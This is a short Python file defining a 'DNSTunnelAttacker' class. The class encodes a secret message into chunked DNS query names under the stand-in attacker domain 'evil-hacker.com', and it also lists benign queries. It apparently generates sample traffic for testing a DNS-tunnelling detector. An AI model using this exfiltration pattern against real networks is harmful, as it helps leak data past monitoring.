from utils import encode_for_dns

class DNSTunnelAttacker:
    def __init__(self, malicious_domain="evil-hacker.com"):
        self.malicious_domain = malicious_domain

    def generate_exfiltration_queries(self, secret_message: str, chunk_size: int = 30) -> list:
        encoded_payload = encode_for_dns(secret_message)
        queries = []
        
        for i in range(0, len(encoded_payload), chunk_size):
            chunk = encoded_payload[i:i+chunk_size]
            query = f"{chunk}.{self.malicious_domain}"
            queries.append(query)
            
        return queries

    def generate_normal_queries(self) -> list:
        return [
            "www.google.com",
            "api.github.com",
            "mail.yahoo.com"
        ]
